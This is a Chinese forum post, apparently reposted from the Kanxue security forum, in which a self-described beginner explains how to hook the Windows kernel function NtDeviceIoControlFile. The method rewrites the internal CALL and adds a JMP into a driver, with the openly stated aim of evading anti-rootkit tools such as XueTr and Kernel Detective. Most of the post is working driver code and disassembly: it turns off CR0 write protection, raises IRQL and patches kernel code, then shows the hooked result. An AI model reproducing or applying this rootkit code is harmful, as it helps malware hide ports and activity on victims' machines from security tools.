
# 利用 HOOK CALL +JMP 方法避开普通 AntiRootKit 工具检测

> 原文：[`www.pediy.com/kssd/pediy12/127252.html`](https://www.pediy.com/kssd/pediy12/127252.html)

最近在研究 `RootKit` 技术，发现普通的 `SSDT` `HOOK` 以及 `inline` `hook` 很容易被一些普通的 `AntiRootKit` 工具检测到，我针对的函数是 `NtDeviceIoControlFile`，看到这个函数大家肯定不陌生，因为这个函数经常被木马，病毒用来隐藏端口（废话）。起初，我想用修改一个字节的方法来 `HOOK`，这个 `HOOK` 方法是由看雪的大牛 `Sysnap` 很久以前提出的，涉及到了 `int 0xff` 中断 ，然后挂钩 `IDT`，但是 `NtDeviceIoControlFile` 这个函数调用频繁，不能用这种 `HOOK` 方式，否则影响效率。![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")所以换种方法，反汇编 `NtDeviceIoControlFile` 的结果如下：

`nt!NtDeviceIoControlFile:`

```
8056f442 8bff           mov      edi,edi
8056f444 55              push     ebp
8056f445 8bec            mov      ebp,esp
8056f447 6a01            push     1
8056f449 ff752c          push     dword ptr [ebp+2Ch]
8056f44c ff7528          push     dword ptr [ebp+28h]
8056f44f ff7524           push     dword ptr [ebp+24h]
8056f452 ff7520          push     dword ptr [ebp+20h]
8056f455 ff751c           push     dword ptr [ebp+1Ch]
8056f458 ff7518           push     dword ptr [ebp+18h]
8056f45b ff7514           push     dword ptr [ebp+14h]
8056f45e ff7510           push     dword ptr [ebp+10h]
8056f461 ff750c            push     dword ptr [ebp+0Ch]
8056f464 ff7508            push     dword ptr [ebp+8]
8056f467 e8ac710000           call     nt!NtWriteFile+0x33d0 (80576618)
8056f46c 5d              pop      ebp
8056f46d c22800          ret     28h
```

可以看出，这个函数什么也没做直接调用了 `nt!NtWriteFile+0x33d0` ，`HOOK` `nt!NtWriteFile+0x33d0` 就等于 `hook` 了 `NtDeviceIoControlFile`，参数处理都基本是一样啊，只多了个 `1`，便宜了我等菜鸟了，呵呵。

在百度上跑了一会，关于 `HOOK` `CALL` 的文章很少（菜鸟心理）。。我找到了一篇，从这文章了解到，原来传说中的东方微点用了好多这种 `HOOK`，好了不废话了，来看看代码实现。。。大牛就请坐筋斗云飘过吧。。![](img/c1d8523a7842d7b67917c210ac6dcf18.jpg "微笑")![](img/c1d8523a7842d7b67917c210ac6dcf18.jpg "微笑")

```
for(cPtr=(PUCHAR)OldZwDeviceIoControlFile;cPtr<(PUCHAR)OldZwDeviceIoControlFile+PAGE_SIZE;cPtr+=Length)
{
   Length=SizeOfCode(cPtr,&pOpcode);
   if(!Length)  break;
   if (Length ==5 && *cPtr==0xE8)
    {
     OldNtWriteFileRva = *(PULONG)(cPtr+1);
     break;
    }
}

Tmp=(ULONG)cPtr+9-((ULONG)cPtr+5);// 计算 CALL 到我们的 JMP 偏移
*(ULONG *)(JmpAddress+1)=(ULONG)NewNtWriteFileNext-((ULONG)cPtr+9+5);//jmp 偏移
 _asm
 {
    push eax
      mov eax, cr0
      mov CR0VALUE, eax
      and eax, 0fffeffffh
      mov cr0, eax
      pop eax
 }
 Irql=KeRaiseIrqlToDpcLevel();
 RtlCopyMemory((ULONG)cPtr+9,JmpAddress,5);
 *(PULONG)(cPtr+1)=Tmp;//直接替我的 FAKE 函地址
 KeLowerIrql(Irql);
 __asm
 {
    push eax
      mov eax, CR0VALUE
      mov cr0, eax
      pop eax
 }
```

微点使用了 `2` 段跳，先把 `CALL` 后面的地址换成内核里的一个 `JMP` 地址，然后再 `JMP` 到自己的驱动

避开了一些 `AntiRootKit` 工具来看看结果：

`nt!NtDeviceIoControlFile:`

```
8056f442 8bff           mov      edi,edi
8056f444 55              push     ebp
8056f445 8bec            mov      ebp,esp
8056f447 6a01            push     1
8056f449 ff752c          push     dword ptr [ebp+2Ch]
8056f44c ff7528          push     dword ptr [ebp+28h]
8056f44f ff7524           push     dword ptr [ebp+24h]
8056f452 ff7520          push     dword ptr [ebp+20h]
8056f455 ff751c           push     dword ptr [ebp+1Ch]
8056f458 ff7518           push     dword ptr [ebp+18h]
8056f45b ff7514           push     dword ptr [ebp+14h]
8056f45e ff7510           push     dword ptr [ebp+10h]
8056f461 ff750c            push     dword ptr [ebp+0Ch]
8056f464 ff7508            push     dword ptr [ebp+8]
8056f467 e804000000        call     nt!NtDeviceIoControlFile+0x2e (8056f470)
8056f46c 5d              pop      ebp
8056f46d c22800          ret     28h
8056f470 e94b316678       jmp      highDeepHookNtDevice!NewNtWriteFileNext (f8bd25c0)
8056f475 cc              int     3
```

呵呵。。这样就避开了一些普通 `AntiRootKit` 工具检测，至少 `XueTr.exe` 是避开了，直接 `CALL` 我们的驱动可以避开 `Kernel_Detective_v1.3.0`，运行稳定。此贴纯属自勉，望大牛们多多指教，小弟感激不尽。小弟还有一个问题，再用 `XDE32` 反汇编引擎里的指令转成机器码的时候出现这样的问题：

```
int Lengthg;
UCHAR JmpAddress[10];
struct xde_instr myjmp={0};
myjmp.opcode=0xea;  //绝对地址跳
myjmp.addrsize=4;
myjmp.datasize=2;
myjmp.addr_l[0]=f8052556;
myjmp.addr_s[0]=8;
Lengthg=xde_asm(JmpAddress,&myjmp);
```

变量 `JmpAddress` 里的机器码写入内存后，再用 `Windbg` 查看的时候为 `jmp 0000:f8052556`  前面 `4` 个 `0` 是怎么出来的？？还有从 `Ring0` 下获取 `SSDT` 原始地址[`bbs.pediy.com/showthread.php?p=810552`](http://bbs.pediy.com/showthread.php?p=810552)里竹君大牛介绍的 `4` 种得到 `SSDT` 地址的方法编译时需要加个什么头文件啊？？望大牛们多多指教，小弟感激不尽，谢谢。。。
